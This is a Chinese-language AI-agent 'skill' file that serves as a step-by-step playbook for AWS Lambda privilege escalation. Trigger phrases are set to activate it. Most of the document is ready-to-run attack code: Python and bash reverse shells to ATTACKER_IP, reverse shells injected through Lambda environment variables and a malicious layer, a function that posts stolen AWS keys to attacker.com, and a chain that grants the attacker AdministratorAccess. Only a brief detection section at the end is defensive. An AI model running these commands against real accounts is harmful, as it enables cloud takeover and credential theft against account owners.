---
name: aws-lambda-privesc
description: AWS Lambda 权限提升完整技术 - 代码注入、环境变量、层利用
category: 云安全渗透测试
platform: AWS
technique_type: 权限提升
triggers:
  - "Lambda 权限提升"
  - "lambda:UpdateFunctionCode 利用"
  - "lambda privesc"
  - "AWS Lambda 渗透"
---

# AWS Lambda 权限提升技术

## 触发条件

当用户要求以下任务时激活此技能：

- "测试 AWS Lambda 权限提升"
- "Lambda 代码注入"
- "lambda:UpdateFunctionCode 利用"
- "Lambda 环境变量 RCE"
- "Lambda 层利用"

---

## 技术清单

### 1. `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

**原理**: 创建带有高权限 IAM Role 的 Lambda 函数并执行恶意代码

**利用步骤**:

```bash
# 步骤 1: 创建恶意代码
cat > rev.py <<'EOF'
import socket, subprocess, os, time
def lambda_handler(event, context):
    # 反向 Shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('ATTACKER_IP', 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(['/bin/sh', '-i'])
    time.sleep(900)
    return 0
EOF

# 步骤 2: 打包代码
zip rev.zip rev.py

# 步骤 3: 创建 Lambda 函数
aws lambda create-function \
  --function-name malicious-function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/TargetLambdaRole \
  --handler rev.lambda_handler \
  --zip-file fileb://rev.zip \
  --region us-east-1

# 步骤 4: 执行函数
aws lambda invoke \
  --function-name malicious-function \
  output.txt

# 步骤 5: 在攻击机上监听
nc -lvnp 4444
```

**影响**: 获得高权限 Lambda Role 的完整访问权限

---

### 2. `iam:PassRole` + `lambda:CreateFunction` + `lambda:AddPermission`

**原理**: 创建 Lambda 函数并给自己授予调用权限

```bash
# 创建函数
aws lambda create-function \
  --function-name my_function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/TargetLambdaRole \
  --handler rev.lambda_handler \
  --zip-file fileb://rev.zip

# 授予自己调用权限
aws lambda add-permission \
  --function-name my_function \
  --action lambda:InvokeFunction \
  --statement-id privesc \
  --principal arn:aws:iam::123456789012:user/my-username

# 调用函数
aws lambda invoke --function-name my_function output.txt
```

**影响**: 绕过缺少 `lambda:InvokeFunction` 权限的限制

---

### 3. `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping`

**原理**: 通过 DynamoDB Stream 间接触发 Lambda 执行

```bash
# 步骤 1: 创建 Lambda 函数
aws lambda create-function \
  --function-name backdoor-function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/TargetLambdaRole \
  --handler rev.lambda_handler \
  --zip-file fileb://rev.zip

# 步骤 2: 创建 DynamoDB 表（如果不存在）
aws dynamodb create-table \
  --table-name trigger-table \
  --attribute-definitions AttributeName=id,AttributeType=S \
  --key-schema AttributeName=id,KeyType=HASH \
  --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
  --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES

# 步骤 3: 获取表的流 ARN
STREAM_ARN=$(aws dynamodb describe-table \
  --table-name trigger-table \
  --query 'Table.LatestStreamArn' \
  --output text)

# 步骤 4: 创建事件源映射
aws lambda create-event-source-mapping \
  --function-name backdoor-function \
  --event-source-arn $STREAM_ARN \
  --enabled \
  --starting-position LATEST

# 步骤 5: 插入数据触发 Lambda
aws dynamodb put-item \
  --table-name trigger-table \
  --item id={S="trigger123"}
```

**影响**: 即使没有调用权限也能触发 Lambda 执行

---

### 4. `lambda:UpdateFunctionCode`

**原理**: 修改现有 Lambda 函数代码窃取凭证

```python
# malicious_lambda.py
import boto3

def lambda_handler(event, context):
    # 方法 1: 创建管理员访问密钥
    client = boto3.client('iam')
    response = client.create_access_key(UserName='admin-user')

    # 方法 2: 通过外带发送凭证
    import requests
    import os

    creds = {
        'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID'),
        'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'SessionToken': os.environ.get('AWS_SESSION_TOKEN')
    }

    requests.post('https://attacker.com/exfil', json=creds)

    # 方法 3: 直接读取 /proc/self/environ
    # credentials = open('/proc/self/environ', 'r').read()

    return {
        'statusCode': 200,
        'body': 'Lambda executed successfully'
    }
```

```bash
# 打包恶意代码
zip malicious.zip malicious_lambda.py

# 修改目标函数
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious.zip

# 等待函数被现有触发器执行
# 或检查是否有公开 URL
aws lambda get-function-url-config --function-name target-function

# 或通过 API Gateway 调用
curl -X POST https://api-id.execute-api.us-east-1.amazonaws.com/prod/target-function
```

**影响**: 通过现有触发器自动窃取凭证

---

### 5. `lambda:UpdateFunctionConfiguration` - 环境变量 RCE

**原理**: 通过环境变量实现代码注入（Python）

```bash
# Python 环境变量注入
aws lambda update-function-configuration \
  --function-name target-function \
  --environment 'Variables={
      PYTHONWARNINGS=all:0:antigravity.x:0:0,
      BROWSER="/bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\'' & #%s"
  }'

# 触发函数执行
aws lambda invoke --function-name target-function output.txt

# 监听连接
nc -lvnp 4444
```

**其他语言的环境变量注入**:

```bash
# Node.js
aws lambda update-function-configuration \
  --function-name target-function \
  --environment 'Variables={
      NODE_OPTIONS="--require /proc/self/environ",
      "PAYLOAD_%": "console.global.process.mainModule.require('\''child_process'\'').exec('\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\'')"
  }'

# Ruby
aws lambda update-function-configuration \
  --function-name target-function \
  --environment 'Variables={
      RUBYLIB="/proc/self/environ",
      "PAYLOAD_%": "require'\''open'\'';exec'\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''"
  }'
```

**影响**: 不修改代码即可实现 RCE

---

### 6. `lambda:UpdateFunctionConfiguration` - 层注入

```bash
# 步骤 1: 创建恶意层
mkdir -p layer/python
cat > layer/python/malicious.py <<'EOF'
import os
import subprocess
# 恶意代码在导入时执行
subprocess.run(['/bin/bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'])
EOF

cd layer
zip -r /tmp/malicious-layer.zip .

# 步骤 2: 发布层
aws lambda publish-layer-version \
  --layer-name malicious-layer \
  --zip-file fileb:///tmp/malicious-layer.zip \
  --compatible-runtimes python3.9

# 步骤 3: 修改函数配置使用层
LAYER_ARN=$(aws lambda list-layer-versions \
  --layer-name malicious-layer \
  --query 'LayerVersions[0].LayerVersionArn' \
  --output text)

aws lambda update-function-configuration \
  --function-name target-function \
  --layers $LAYER_ARN

# 步骤 4: 触发函数
aws lambda invoke --function-name target-function output.txt
```

**影响**: 通过层注入实现持久化后门

---

### 7. `lambda:AddPermission`

**原理**: 给自己授予 Lambda 的完整权限

```bash
# 授予自己所有权限
aws lambda add-permission \
  --function-name target-function \
  --statement-id full-access \
  --action '*' \
  --principal arn:aws:iam::123456789012:user/my-username

# 现在可以修改代码
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious.zip

# 调用函数
aws lambda invoke --function-name target-function output.txt
```

**影响**: 完全控制目标 Lambda 函数

---

### 8. 凭证外带 - 网络隔离环境

**原理**: 在网络隔离环境中通过函数返回值泄露凭证

```python
# credential_leak.py
def lambda_handler(event, context):
    # 读取环境变量中的凭证
    import os
    credentials = {
        'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID'),
        'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'SessionToken': os.environ.get('AWS_SESSION_TOKEN')
    }

    # 通过返回值泄露
    return {
        'statusCode': 200,
        'credentials': credentials,
        'environ': str(os.environ)
    }
```

```bash
# 部署函数
zip credential_leak.zip credential_leak.py
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://credential_leak.zip

# 调用并获取凭证
aws lambda invoke \
  --function-name target-function \
  --query 'Payload' \
  --output text | jq -r '.credentials'
```

**影响**: 绕过网络限制获取凭证

---

### 9. Lambda 函数 URL 利用

```bash
# 检查函数 URL 配置
aws lambda get-function-url-config \
  --function-name target-function

# 如果不存在，创建函数 URL
aws lambda create-function-url-config \
  --function-name target-function \
  --auth-type NONE

# 获取 URL
aws lambda get-function-url-config \
  --function-name target-function \
  --query 'FunctionUrl' \
  --output text

# 通过 URL 调用函数
curl -X POST https://xxxxxxxxxx.lambda-url.us-east-1.on.aws/
```

**影响**: 无需 AWS 凭证即可调用函数

---

## Lambda 权限提升决策树

```
获取到 Lambda 权限
│
├─ 有 iam:PassRole + lambda:CreateFunction
│  ├─ 有 lambda:InvokeFunction → 创建并执行恶意函数
│  ├─ 有 lambda:AddPermission → 创建函数并授权给自己
│  └─ 有 lambda:CreateEventSourceMapping → 使用 DynamoDB Stream 触发
│
├─ 有 lambda:UpdateFunctionCode
│  └─ 修改现有函数代码窃取凭证
│
├─ 有 lambda:UpdateFunctionConfiguration
│  ├─ 环境变量 RCE
│  └─ 层注入
│
└─ 有 lambda:AddPermission
   └─ 授予自己完整权限
```

---

## 完整攻击流程

### 场景 1: 从零到管理员

```bash
# 步骤 1: 枚举 Lambda 权限
aws iam list-attached-user-policies --user-name my-user
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/my-user \
  --action-names lambda:CreateFunction,lambda:InvokeFunction,iam:PassRole

# 步骤 2: 发现有 iam:PassRole + lambda:CreateFunction
# 列出可用的 Lambda Roles
aws iam list-roles --query 'Roles[?contains(RoleName, `lambda`)].RoleName'

# 步骤 3: 创建恶意 Lambda
cat > admin_privesc.py <<'EOF'
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
EOF

zip admin_privesc.zip admin_privesc.py

# 步骤 4: 部署函数
aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaExecutionRole \
  --handler admin_privesc.lambda_handler \
  --zip-file fileb://admin_privesc.zip

# 步骤 5: 执行权限提升
aws lambda invoke --function-name privesc-function output.txt

# 步骤 6: 验证权限
aws iam list-attached-user-policies --user-name my-user
```

---

## 防御措施

### 检测方法

```bash
# 监控 Lambda 函数创建
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction

# 监控代码更新
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode

# 监控环境变量变更
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionConfiguration
```

### 防御建议

1. **最小权限**: 严格限制 Lambda 执行角色权限
2. **资源策略**: 定期审查 Lambda 资源策略
3. **网络隔离**: 在 VPC 中运行 Lambda 并限制出站流量
4. **监控告警**: 配置 CloudWatch 告警监控异常 Lambda 活动
5. **代码审查**: 定期审查 Lambda 代码和环境变量

---

## 参考资源

- HackTricks Lambda Privesc: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-pentesting/aws-privilege-escalation/aws-lambda-privesc
- AWS Lambda 安全: https://docs.aws.amazon.com/lambda/latest/dg/security.html
- Rhino Security Labs - Lambda Privesc: https://rhinosecuritylabs.com/aws/aws-security-within-a-lambda/
